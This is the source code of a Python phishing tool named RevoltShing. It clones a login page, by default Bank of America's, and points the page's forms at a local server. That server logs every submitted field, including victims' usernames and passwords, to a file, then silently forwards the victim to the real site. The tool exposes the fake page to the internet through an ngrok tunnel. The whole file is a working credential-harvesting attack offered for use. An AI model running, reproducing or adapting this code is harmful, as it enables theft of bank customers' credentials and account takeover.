#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Github: https://github.com/AngelSecurityTeam
from os import system
from time import sleep
import socketserver
import os
import urllib.request as ulib
import cgi
import re
from bs4 import BeautifulSoup as bs
import http.server
from subprocess import check_output

RED, WHITE, CYAN, GREEN, DEFAULT, CYANCLARO = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m', '\033[1;36m'

def main():
	print ("""
{3}
 ███████████                           ████ █████   █████████ █████     ███                  
░░███░░░░░███                         ░░███░░███   ███░░░░░██░░███     ░░░                   
 ░███    ░███  ██████ █████ ███████████░██████████░███    ░░░ ░███████ ████████████   ███████
{1} ░██████████  ███░░██░░███ ░░██████░░██░██░░░███░ ░░█████████ ░███░░██░░██░░███░░███ ███░░███
{3} ░███░░░░░███░███████ ░███  ░██░███ ░██░███ ░███   ░░░░░░░░███░███ ░███░███░███ ░███░███ ░███
{3} ░███    ░███░███░░░  ░░███ ███░███ ░██░███ ░███ █████    ░███░███ ░███░███░███ ░███░███ ░███
{1} █████   ████░░██████  ░░█████ ░░███████████░░████░░█████████ ████ ████████████ ████░░███████
{3}░░░░░   ░░░░░ ░░░░░░    ░░░░░   ░░░░░░░░░░░  ░░░░░ ░░░░░░░░░ ░░░░ ░░░░░░░░░░░░ ░░░░░ ░░░░░███
                                                                  {0}AngelSecurityTeam {1} ███ ░███
                                                                                   {3} ░░██████ {1}V.2
                                                                                     ░░░░░░  
""".format(CYAN, DEFAULT, GREEN, RED, CYANCLARO,GREEN))
                                                                                                                                  
	while True:
		help()
		try:		
			comm=input("{0}RevoltShing{1} >> {2}".format(CYAN, RED, DEFAULT)).split()		
			if not comm:
				print(end=" ")
			elif comm[0]=="edit":
				if(comm[1]=="url"):
					global url
					url=comm[2] 																		
				if(comm[1]=="port"):
					global port
					port=int(comm[2])                   
				if(comm[1]=="url_destination"):
					global url_destination
					url_destination=comm[2]					
				if(comm[1]=="user_agent"):
					global user_agent
					if(len(comm)==3):
						user_agent=comm[2]
					else:
						user_agent=input("\n\033[36mUser_Agent : ")
						print(" ")
						
				else:
					print("")									
			elif comm[0]=="start":
				w=revoltshing( url, port) # start
				w.clonar() # start
				w.servidor() #start
			elif comm[0]=="exit":
				os.system("fuser -k -n tcp 8080 ") #default port 8080
				exit()
			else:
				print()
		except KeyboardInterrupt:
			os.system("fuser -k -n tcp 8080")#default port 8080
			w=revoltshing( url, port)
			w.eliminar()			
			print()

def help():		
	print("\t{2}{0}[{3}*{0}]{0} edit     {2}   : {3}Edit {3} [{0}url,port,url_destination,user_agent{3}]{0}".format(CYAN, DEFAULT, GREEN, RED))
	print("\t{0}[{3}*{0}]{0} start    {2}   :{3} Start Server".format(CYAN, DEFAULT, GREEN, RED))
	print("\t{0}[{3}*{0}]{0} exit       {2} :{3} exit".format(CYAN, DEFAULT, GREEN, RED))
	print("\t{0}[{3}*{0}]{0} port       {2} :{3}".format(CYAN, DEFAULT, GREEN, RED),port )
	print("\t{0}[{3}*{0}]{0} url        {2} :{3}".format(CYAN, DEFAULT, GREEN, RED),url )
	print("\t{0}[{3}*{0}]{0} url_destination{2} :{3}".format(CYAN, DEFAULT, GREEN, RED),url_destination)
	print("\t{0}[{3}*{0}]{0} user_agent {2} :{3}".format(CYAN, DEFAULT, GREEN, RED),user_agent)
	print()
	
port=int(8080) #default
url="https://www.bankofamerica.com"  #default
url_destination="https://www.bankofamerica.com/"  #default
user_agent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"  #default

class handler(http.server.SimpleHTTPRequestHandler):
	def do_POST(self):
		post_request = []
		print("\t"+self.address_string(),"sent POST req")
		form = cgi.FieldStorage(self.rfile,headers=self.headers,
		    environ={'REQUEST_METHOD':'POST',
			     'CONTENT_TYPE':self.headers['Content-Type'],})
		log=open(url.split("//")[1]+".log","a+")
		log.write("-----------------------")
		log.write("----------------------- "+url+"\n")
		for tag in form.list:
			tmp = str(tag).split("(")[1]
			key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
			post_request.append((key,value))
			print("\t"+key+" = "+value)
			log.write(key+"="+value+"\n")		
		log.close();
		create_post(url,url_destination,post_request)
		http.server.SimpleHTTPRequestHandler.do_GET(self)
		

def create_post(url,url_destination,post_request):

	ref = open("ref.html","w")
	ref.write("<body><form id=\"ff\" action=\""+url_destination+"\" method=\"post\" >\n")	
	for post in post_request:
		key,value = post
		ref.write("<input name=\""+key+"\" value=\""+value+"\" type=\"hidden\" >\n" )	
	ref.write("<input name=\"login\" type=\"hidden\">")
	ref.write("<script langauge=\"javascript\">document.forms[\"ff\"].submit();</script>")
	ref.close()

class revoltshing:
	def __init__(self,url,port):
		self.port=port
		self.url=url
		self.httpd=None
		self.form_url=None

	def clonar(self):		
		data = ulib.urlopen(self.url).read()		
		data = bs(data,"html.parser")
		for tag in data.find_all("form"):
			tag["action"]="ref.html"
			tag["method"]="post"		
		with open("index.html", "w") as index:
	    		index.write(data.prettify())
	    		index.close()
	def servidor(self):
            port22=port		      
            os.system("chmod +x ngrok")
            os.system("./ngrok http {} > /dev/null &".format(port22))
            sleep(8)
            os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
            urlFile = open('link2.url', 'r')
            url = urlFile.read()
            urlFile.close()
            if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
              print("\n\t\033[36mNGROK URL \033[1;39m: " + url)
            self.httpd = socketserver.TCPServer(("",self.port),handler)
            self.httpd.serve_forever()
	def eliminar(self):
		print()
		if os.path.exists("index.html"):
			os.remove("index.html")
		if os.path.exists("ref.html"):
			os.remove("ref.html")
if __name__=="__main__":
  main()
